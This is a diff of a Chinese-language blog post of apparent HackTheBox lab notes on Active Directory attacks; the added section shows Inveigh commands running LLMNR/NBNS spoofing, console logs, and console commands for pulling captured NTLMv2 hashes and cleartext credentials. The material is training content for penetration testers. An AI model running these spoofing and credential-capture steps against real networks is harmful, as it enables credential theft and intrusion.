@@ -9,7 +9,7 @@ Sniffing out a Foothold
 External Information Gathering (Passive Checks)外部信息收集被授权证明与可以从互联网上收集的有关公司的信息相关的风险。
 Internal Testing内部评估部分旨在通过尝试模拟Inlanefreight运营区域内的攻击向量来证明与内部主机和服务（特别是Active Directory）上的漏洞相关的风险。这一结果将使Inlanefright能够评估内部漏洞的风险以及成功利用漏洞的潜在影响。 
 Password Testing从Inlanefreight设备捕获或由组织提供的密码文件可以加载到离线工作站上进行解密，并用.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
-</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">AD</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#External-Information-Gathering-Passive-Checks"><span class="toc-text">External Information Gathering (Passive Checks)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Internal-Testing"><span class="toc-text">Internal Testing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Testing"><span class="toc-text">Password Testing</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-Are-We-Looking-For"><span class="toc-text">What Are We Looking For?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Public-Data"><span class="toc-text">Public Data</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hunting-For-Files"><span class="toc-text">Hunting For Files</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hunting-E-mail-Addresses"><span class="toc-text">Hunting E-mail Addresses</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#E-mail-Dork-Results"><span class="toc-text">E-mail Dork Results</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Username-Harvesting"><span class="toc-text">Username Harvesting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Credential-Hunting"><span class="toc-text">Credential Hunting</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Enumeration-of-the-Domain"><span class="toc-text">Initial Enumeration of the Domain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Data-Points"><span class="toc-text">Key Data Points</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TTPs"><span class="toc-text">TTPs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-Hosts"><span class="toc-text">Identifying Hosts</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Start-Wireshark-on-ea-attack01"><span class="toc-text">Start Wireshark on ea-attack01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-Responder"><span class="toc-text">Starting Responder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FPing-Active-Checks"><span class="toc-text">FPing Active Checks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap-Scanning"><span class="toc-text">Nmap Scanning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NMAP-Result-Highlights"><span class="toc-text">NMAP Result Highlights</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identifying-Users"><span class="toc-text">Identifying Users</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identifying-Users-1"><span class="toc-text">Identifying Users</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cloning-Kerbrute-GitHub-Repo"><span class="toc-text">Cloning Kerbrute GitHub Repo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Testing-the-kerbrute-linux-amd64-Binary"><span class="toc-text">Testing the kerbrute_linux_amd64 Binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adding-the-Tool-to-our-Path"><span class="toc-text">Adding the Tool to our Path</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Moving-the-Binary"><span class="toc-text">Moving the Binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumerating-Users-with-Kerbrute"><span class="toc-text">Enumerating Users with Kerbrute</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identifying-Potential-Vulnerabilities"><span class="toc-text">Identifying Potential Vulnerabilities</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sniffing-out-a-Foothold"><span class="toc-text">Sniffing out a Foothold</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LLMNR-x2F-NBT-NS-Poisoning-from-Linux"><span class="toc-text">LLMNR&#x2F;NBT-NS Poisoning - from Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LLMNR-amp-NBT-NS-Primer"><span class="toc-text">LLMNR &amp; NBT-NS Primer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Example-LLMNR-x2F-NBT-NS-Poisoning"><span class="toc-text">Quick Example - LLMNR&#x2F;NBT-NS Poisoning *</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Responder-In-Action"><span class="toc-text">Responder In Action *</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Responder-Logs"><span class="toc-text">Responder Logs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-Responder-with-Default-Settings"><span class="toc-text">Starting Responder with Default Settings</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LLMNR-x2F-NBT-NS-Poisoning-from-Windows"><span class="toc-text">LLMNR&#x2F;NBT-NS Poisoning - from Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Inveigh-Overview"><span class="toc-text">Inveigh - Overview</span></a></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a><a href="/tags/AD"><i class="tag post-item-tag">AD</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">AD</h1><time class="has-text-grey" datetime="2023-09-23T03:54:00.000Z">2023-09-23</time><article class="mt-2 post-content"><ul>
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">AD</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#External-Information-Gathering-Passive-Checks"><span class="toc-text">External Information Gathering (Passive Checks)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Internal-Testing"><span class="toc-text">Internal Testing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Testing"><span class="toc-text">Password Testing</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-Are-We-Looking-For"><span class="toc-text">What Are We Looking For?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Public-Data"><span class="toc-text">Public Data</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hunting-For-Files"><span class="toc-text">Hunting For Files</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hunting-E-mail-Addresses"><span class="toc-text">Hunting E-mail Addresses</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#E-mail-Dork-Results"><span class="toc-text">E-mail Dork Results</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Username-Harvesting"><span class="toc-text">Username Harvesting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Credential-Hunting"><span class="toc-text">Credential Hunting</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Enumeration-of-the-Domain"><span class="toc-text">Initial Enumeration of the Domain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Data-Points"><span class="toc-text">Key Data Points</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TTPs"><span class="toc-text">TTPs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-Hosts"><span class="toc-text">Identifying Hosts</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Start-Wireshark-on-ea-attack01"><span class="toc-text">Start Wireshark on ea-attack01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-Responder"><span class="toc-text">Starting Responder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FPing-Active-Checks"><span class="toc-text">FPing Active Checks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap-Scanning"><span class="toc-text">Nmap Scanning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NMAP-Result-Highlights"><span class="toc-text">NMAP Result Highlights</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identifying-Users"><span class="toc-text">Identifying Users</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identifying-Users-1"><span class="toc-text">Identifying Users</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cloning-Kerbrute-GitHub-Repo"><span class="toc-text">Cloning Kerbrute GitHub Repo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Testing-the-kerbrute-linux-amd64-Binary"><span class="toc-text">Testing the kerbrute_linux_amd64 Binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adding-the-Tool-to-our-Path"><span class="toc-text">Adding the Tool to our Path</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Moving-the-Binary"><span class="toc-text">Moving the Binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumerating-Users-with-Kerbrute"><span class="toc-text">Enumerating Users with Kerbrute</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identifying-Potential-Vulnerabilities"><span class="toc-text">Identifying Potential Vulnerabilities</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sniffing-out-a-Foothold"><span class="toc-text">Sniffing out a Foothold</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LLMNR-x2F-NBT-NS-Poisoning-from-Linux"><span class="toc-text">LLMNR&#x2F;NBT-NS Poisoning - from Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LLMNR-amp-NBT-NS-Primer"><span class="toc-text">LLMNR &amp; NBT-NS Primer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Example-LLMNR-x2F-NBT-NS-Poisoning"><span class="toc-text">Quick Example - LLMNR&#x2F;NBT-NS Poisoning *</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Responder-In-Action"><span class="toc-text">Responder In Action *</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Responder-Logs"><span class="toc-text">Responder Logs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-Responder-with-Default-Settings"><span class="toc-text">Starting Responder with Default Settings</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LLMNR-x2F-NBT-NS-Poisoning-from-Windows"><span class="toc-text">LLMNR&#x2F;NBT-NS Poisoning - from Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Inveigh-Overview"><span class="toc-text">Inveigh - Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-Inveigh"><span class="toc-text">Using Inveigh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-Inveigh-InveighZero"><span class="toc-text">C# Inveigh (InveighZero)</span></a></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a><a href="/tags/AD"><i class="tag post-item-tag">AD</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">AD</h1><time class="has-text-grey" datetime="2023-09-23T03:54:00.000Z">2023-09-23</time><article class="mt-2 post-content"><ul>
 <li>Sniffing out a Foothold</li>
 <li>Initial Enumeration</li>
 <li>Sniffing out a Foothold</li>
@@ -323,4 +323,151 @@ Proxy-Auth-NTLMv2-172.16.5.200.txt
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309232006463.png" alt="image"></p>
 <h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Windows"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Windows" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Windows"></a>LLMNR&#x2F;NBT-NS Poisoning - from Windows</h1><p>本节将探讨 <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>工具，并尝试捕获另一组凭据。</p>
-<h2 id="Inveigh-Overview"><a href="#Inveigh-Overview" class="headerlink" title="Inveigh - Overview"></a>Inveigh - Overview</h2></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/09/23/AD-Cheat-Sheet/" title="AD_Cheat_Sheet"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: AD_Cheat_Sheet</span></a><a class="button is-default" href="/2023/09/18/Information-Gathering/" title="Information Gathering"><span class="has-text-weight-semibold">Next: Information Gathering</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
+<h2 id="Inveigh-Overview"><a href="#Inveigh-Overview" class="headerlink" title="Inveigh - Overview"></a>Inveigh - Overview</h2><p>工具Inveigh的工作原理与Responder类似，但使用PowerShell和C#编写。Inveigh可以监听IPv4和IPv6以及其他几种协议，包括LLMNR、DNS、mDNS、NBNS、DHCPv6、ICMPv6、HTTP、HTTPS、SMB、LDAP、WebDAV和代理身份验证。</p>
+<h2 id="Using-Inveigh"><a href="#Using-Inveigh" class="headerlink" title="Using Inveigh"></a>Using Inveigh</h2><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\Inveigh.ps1
+PS C:\htb&gt; (Get-Command Invoke-Inveigh).Parameters
+</code></pre>
+<p>让我们从LLMNR和NBNS欺骗开始Inveigh，然后输出到控制台并写入文件。我们将保留其余的默认值，这可以在这里看到 <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh#parameter-help">here</a>。</p>
+<pre><code class="powershell-session">PS C:\htb&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+[*] Inveigh 1.506 started at 2022-02-28T19:26:30
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 172.16.5.25
+[+] Spoofer IP Address = 172.16.5.25
+[+] ADIDNS Spoofer = Disabled
+[+] DNS Spoofer = Enabled
+[+] DNS TTL = 30 Seconds
+[+] LLMNR Spoofer = Enabled
+[+] LLMNR TTL = 30 Seconds
+[+] mDNS Spoofer = Disabled
+[+] NBNS Spoofer For Types 00,20 = Enabled
+[+] NBNS TTL = 165 Seconds
+[+] SMB Capture = Enabled
+[+] HTTP Capture = Enabled
+[+] HTTPS Certificate Issuer = Inveigh
+[+] HTTPS Certificate CN = localhost
+[+] HTTPS Capture = Enabled
+[+] HTTP/HTTPS Authentication = NTLM
+[+] WPAD Authentication = NTLM
+[+] WPAD NTLM Authentication Ignore List = Firefox
+[+] WPAD Response = Enabled
+[+] Kerberos TGT Capture = Disabled
+[+] Machine Account Capture = Disabled
+[+] Console Output = Full
+[+] File Output = Enabled
+[+] Output Directory = C:\Tools
+WARNING: [!] Run Stop-Inveigh to stop
+[*] Press any key to stop console output
+WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
+WARNING: [!] [2022-02-28T19:26:31] Exception calling &quot;Start&quot; with &quot;0&quot; argument(s): &quot;An attempt was made to access a
+socket in a way forbidden by its access permissions&quot; $HTTP_listener.Start()
+[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
+[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
+[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834
+
+&lt;SNIP&gt;
+</code></pre>
+<p>我们可以看到，我们立即开始获取LLMNR和mDNS请求。下面的动画显示了该工具的作用。</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png" alt="image"></p>
+<h2 id="C-Inveigh-InveighZero"><a href="#C-Inveigh-InveighZero" class="headerlink" title="C# Inveigh (InveighZero)"></a>C# Inveigh (InveighZero)</h2><p>Invenigh的PowerShell版本是原始版本，不再更新。工具作者维护C#版本，该版本结合了原始PoC C#代码和PowerShell版本中大部分代码的C#端口。在我们可以使用C#版本的工具之前，我们必须编译可执行文件</p>
+<pre><code class="powershell-session">PS C:\htb&gt; .\Inveigh.exe
+</code></pre>
+<pre><code class="powershell-session">[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
+[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
+[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
+[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
+[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
+[ ] DHCPv6
+[+] DNS Packet Sniffer [Type A]
+[ ] ICMPv6
+[+] LLMNR Packet Sniffer [Type A]
+[ ] MDNS
+[ ] NBNS
+[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
+[ ] HTTPS
+[+] WebDAV [WebDAVAuth NTLM]
+[ ] Proxy
+[+] LDAP Listener [Port 389]
+[+] SMB Packet Sniffer [Port 445]
+[+] File Output [C:\Tools]
+[+] Previous Session Files (Not Found)
+[*] Press ESC to enter/exit interactive console
+[!] Failed to start HTTP listener on port 80, check IP and port usage.
+[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
+[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
+[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
+[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
+[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
+[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+</code></pre>
+<p>正如我们所看到的，该工具启动并显示哪些选项默认启用，哪些选项未启用。带[+]的选项是默认的，默认情况下是启用的，之前带[]的选项是禁用的。正在运行的控制台输出还向我们显示了哪些选项被禁用，因此不会发送响应（上例中为mDNS）。我们还可以看到消息Press ESC to enter&#x2F;exit interactive console，这在运行该工具时非常有用。控制台允许我们访问捕获的凭据&#x2F;哈希，允许我们停止Inveigh等。</p>
+<p>我们可以在Inveigh运行时按esc键进入控制台。</p>
+<pre><code class="powershell-session">&lt;SNIP&gt;
+
+[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
+[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
+[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311
+C(0:0) NTLMv1(0:0) NTLMv2(3:9)&gt; HELP
+</code></pre>
+<p>在键入HELP并点击enter后，我们将看到几个选项：</p>
+<pre><code class="powershell-session">=============================================== Inveigh Console Commands ===============================================
+
+Command                           Description
+========================================================================================================================
+GET CONSOLE                     | get queued console output
+GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
+GET LOG                         | get log entries; add search string to filter results
+GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
+GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
+GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
+GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
+GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
+GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
+GET CLEARTEXT                   | get captured cleartext credentials
+GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
+GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
+GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
+GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
+GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
+GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
+GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
+GET IGNOREIPS                   | get IgnoreIPs parameter startup values
+GET IGNOREMACS                  | get IgnoreMACs parameter startup values
+SET CONSOLE                     | set Console parameter value
+HISTORY                         | get command history
+RESUME                          | resume real time console output
+STOP                            | stop Inveigh
+</code></pre>
+<p>我们可以通过键入GET NTLMV2UNIQUE快速查看捕获的唯一哈希。</p>
+<p>我们可以键入GET NTLMV2USERNAMES并查看我们收集了哪些用户名。如果我们想要一个用户列表来执行额外的枚举，并查看哪些值得尝试使用Hashcat离线破解，这将非常有用。</p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/09/23/AD-Cheat-Sheet/" title="AD_Cheat_Sheet"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: AD_Cheat_Sheet</span></a><a class="button is-default" href="/2023/09/18/Information-Gathering/" title="Information Gathering"><span class="has-text-weight-semibold">Next: Information Gathering</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script 